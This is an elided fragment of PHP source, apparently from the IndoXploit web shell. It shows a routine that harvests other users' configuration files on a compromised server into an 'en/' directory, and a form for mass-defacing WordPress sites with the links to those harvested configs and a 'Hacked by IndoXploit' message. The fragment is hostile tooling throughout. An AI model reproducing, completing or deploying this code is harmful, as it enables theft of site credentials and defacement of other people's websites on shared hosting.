...
if($_GET['do'] == 'upload') {
				...
				if(is_readable($user_config_dir)) {
					...
					foreach($grab_config as $config => $nama_config) {
						...
						if($ambil_config == '') {
							...
							$file_config = fopen("en/$user_idx-$nama_config.txt","w");
	...
	echo "<center><a href='?dir=$dir/en'><font color=lime>Done</font></a></center>";
	...
	if($_POST['auto_deface_wp']) {
		...
		<form method='post'>
		Link Config: <br>
		<textarea name='link' placeholder='http://target.com/en/user-config.txt' style='width: 450px; height:250px;'></textarea><br>
		<input type='text' name='script' height='10' size='50' placeholder='Hacked by IndoXploit' required><br>
		<input type='submit' style='width: 450px;' name='auto_deface_wp' value='Hajar!!'>
		</form></center>";
	}
